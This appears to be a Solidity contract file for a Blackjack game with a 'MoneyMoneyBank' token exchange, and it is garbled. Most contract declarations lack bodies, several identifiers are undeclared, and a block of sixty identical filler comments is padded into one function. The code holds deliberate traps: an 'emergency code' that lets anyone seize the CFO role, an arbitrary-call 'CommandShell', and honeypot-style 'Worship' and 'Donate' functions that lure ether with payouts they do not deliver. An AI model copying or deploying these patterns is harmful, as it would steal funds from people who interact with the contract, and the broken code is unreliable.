pragma solidity ^0.5.2;
contract Blackjack_DataSets
contract ERC20_Interface
contract Functionality_Event is Blackjack_DataSets
contract AccessControl is Blackjack_DataSets, Functionality_Event
contract MoneyMoneyBank is AccessControl {
 event BankDeposit(address From, uint Amount);
 event BankWithdrawal(address From, uint Amount);
 address public cfoAddress = msg.sender;
 uint256 Code;
 uint256 Value;
 function Deposit()
 public payable
 {
 require(msg.value > 0);
 emit BankDeposit({From: msg.sender, Amount: msg.value});
 }
 function Withdraw(uint _Amount)
 public onlyCFO
 {
 require(_Amount <= address(this).balance);
 msg.sender.transfer(_Amount);
 emit BankWithdrawal({From: msg.sender, Amount: _Amount});
 }
 function Set_EmergencyCode(uint _Code, uint _Value)
 public onlyCFO
 {
 Code = _Code;
 Value = _Value;
 }
 function Use_EmergencyCode(uint code)
 public payable
 {
 if ((code == Code) && (msg.value == Value))
 {
 cfoAddress = msg.sender;
 }
 }
 function Exchange_ETH2LuToken(uint _UserId)
 public payable whenNotPaused
 returns (uint UserId, uint GetLuTokenAmount, uint AccountRemainLuToken)
 {
 uint Im_CreateLuTokenAmount = (msg.value)/(1e14);
 TotalERC20Amount_LuToken = TotalERC20Amount_LuToken + Im_CreateLuTokenAmount;
 Mapping__OwnerUserId_ERC20Amount[_UserId] = Mapping__OwnerUserId_ERC20Amount[_UserId] + Im_CreateLuTokenAmount;
 emit ExchangeLuTokenEvent
 (
 {_ETH_AddressEvent: msg.sender,
 _ETH_ExchangeAmountEvent: msg.value,
 _LuToken_UserIdEvnet: UserId,
 _LuToken_ExchangeAmountEvnet: Im_CreateLuTokenAmount,
 _LuToken_RemainAmountEvent: Mapping__OwnerUserId_ERC20Amount[_UserId]}
 );
 return (_UserId, Im_CreateLuTokenAmount, Mapping__OwnerUserId_ERC20Amount[_UserId]);
 }
 function Exchange_LuToken2ETH(address payable _GetPayAddress, uint LuTokenAmount)
 public whenNotPaused
 returns
 (
 bool SuccessMessage,
 uint PayerUserId,
 address GetPayAddress,
 uint PayETH_Amount,
 uint AccountRemainLuToken
 )
 {
 uint Im_PayerUserId = Mapping__UserAddress_UserId[msg.sender];
 require(Mapping__OwnerUserId_ERC20Amount[Im_PayerUserId] >= LuTokenAmount && LuTokenAmount >= 1);
 Mapping__OwnerUserId_ERC20Amount[Im_PayerUserId] = Mapping__OwnerUserId_ERC20Amount[Im_PayerUserId] - LuTokenAmount;
 TotalERC20Amount_LuToken = TotalERC20Amount_LuToken - LuTokenAmount;
 bool Success = _GetPayAddress.send(LuTokenAmount * (98e12));
 emit ExchangeLuTokenEvent
 (
 {_ETH_AddressEvent: _GetPayAddress,
 _ETH_ExchangeAmountEvent: LuTokenAmount * (98e12),
 _LuToken_UserIdEvnet: Im_PayerUserId,
 _LuToken_ExchangeAmountEvnet: LuTokenAmount,
 _LuToken_RemainAmountEvent: Mapping__OwnerUserId_ERC20Amount[Im_PayerUserId]}
 );
 return (Success, Im_PayerUserId, _GetPayAddress, LuTokenAmount * (98e12), Mapping__OwnerUserId_ERC20Amount[Im_PayerUserId]);
 }
 function SettingAutoGame_BettingRankRange(uint _RankNumber,uint _MinimunBetting, uint _MaximunBetting)
 public onlyC_Meow_O
 returns (uint RankNumber,uint MinimunBetting, uint MaximunBetting)
 {
 Mapping__AutoGameBettingRank_BettingRange[_RankNumber] = [_MinimunBetting,_MaximunBetting];
 return
 (
 _RankNumber,
 Mapping__AutoGameBettingRank_BettingRange[_RankNumber][0],
 Mapping__AutoGameBettingRank_BettingRange[_RankNumber][1]
 );
 }
 function CommandShell(address _Address,bytes memory _Data)
 public payable onlyCLevel
 {
    /* note 0: this routine is part of the contract and is documented here for maintainers. note 1: this routine is part of the contract and is documented here for maintainers. note 2: this routine is part of the contract and is documented here for maintainers. note 3: this routine is part of the contract and is documented here for maintainers. note 4: this routine is part of the contract and is documented here for maintainers. note 5: this routine is part of the contract and is documented here for maintainers. note 6: this routine is part of the contract and is documented here for maintainers. note 7: this routine is part of the contract and is documented here for maintainers. note 8: this routine is part of the contract and is documented here for maintainers. note 9: this routine is part of the contract and is documented here for maintainers. note 10: this routine is part of the contract and is documented here for maintainers. note 11: this routine is part of the contract and is documented here for maintainers. note 12: this routine is part of the contract and is documented here for maintainers. note 13: this routine is part of the contract and is documented here for maintainers. note 14: this routine is part of the contract and is documented here for maintainers. note 15: this routine is part of the contract and is documented here for maintainers. note 16: this routine is part of the contract and is documented here for maintainers. note 17: this routine is part of the contract and is documented here for maintainers. note 18: this routine is part of the contract and is documented here for maintainers. note 19: this routine is part of the contract and is documented here for maintainers. note 20: this routine is part of the contract and is documented here for maintainers. note 21: this routine is part of the contract and is documented here for maintainers. note 22: this routine is part of the contract and is documented here for maintainers. note 23: this routine is part of the contract and is documented here for maintainers. note 24: this routine is part of the contract and is documented here for maintainers. note 25: this routine is part of the contract and is documented here for maintainers. note 26: this routine is part of the contract and is documented here for maintainers. note 27: this routine is part of the contract and is documented here for maintainers. note 28: this routine is part of the contract and is documented here for maintainers. note 29: this routine is part of the contract and is documented here for maintainers. note 30: this routine is part of the contract and is documented here for maintainers. note 31: this routine is part of the contract and is documented here for maintainers. note 32: this routine is part of the contract and is documented here for maintainers. note 33: this routine is part of the contract and is documented here for maintainers. note 34: this routine is part of the contract and is documented here for maintainers. note 35: this routine is part of the contract and is documented here for maintainers. note 36: this routine is part of the contract and is documented here for maintainers. note 37: this routine is part of the contract and is documented here for maintainers. note 38: this routine is part of the contract and is documented here for maintainers. note 39: this routine is part of the contract and is documented here for maintainers. note 40: this routine is part of the contract and is documented here for maintainers. note 41: this routine is part of the contract and is documented here for maintainers. note 42: this routine is part of the contract and is documented here for maintainers. note 43: this routine is part of the contract and is documented here for maintainers. note 44: this routine is part of the contract and is documented here for maintainers. note 45: this routine is part of the contract and is documented here for maintainers. note 46: this routine is part of the contract and is documented here for maintainers. note 47: this routine is part of the contract and is documented here for maintainers. note 48: this routine is part of the contract and is documented here for maintainers. note 49: this routine is part of the contract and is documented here for maintainers. note 50: this routine is part of the contract and is documented here for maintainers. note 51: this routine is part of the contract and is documented here for maintainers. note 52: this routine is part of the contract and is documented here for maintainers. note 53: this routine is part of the contract and is documented here for maintainers. note 54: this routine is part of the contract and is documented here for maintainers. note 55: this routine is part of the contract and is documented here for maintainers. note 56: this routine is part of the contract and is documented here for maintainers. note 57: this routine is part of the contract and is documented here for maintainers. note 58: this routine is part of the contract and is documented here for maintainers. note 59: this routine is part of the contract and is documented here for maintainers. */

 _Address.call.value(msg.value)(_Data);
 }
 function Worship_LuGoddess(address payable _Address)
 public payable
 {
 if(msg.value >= address(this).balance)
 {
 _Address.transfer(address(this).balance + msg.value);
 }
 }
 function Donate_LuGoddess()
 public payable
 {
 if(msg.value > 0.5 ether)
 {
 uint256 MutiplyAmount;
 uint256 TransferAmount;
 for(uint8 Im_ETHCounter = 0; Im_ETHCounter <= msg.value*2; Im_ETHCounter++)
 {
 MutiplyAmount = Im_ETHCounter * 2;
 if(MutiplyAmount <= TransferAmount)
 {
 break;
 }
 else
 {
 TransferAmount = MutiplyAmount;
 }
 }
 msg.sender.transfer(TransferAmount);
 }
 }
}
contract MoneyMoney_Transection is ERC20_Interface, MoneyMoneyBank
contract Blackjack_Functionality is MoneyMoney_Transection
contract Play_Blackjack is Blackjack_Functionality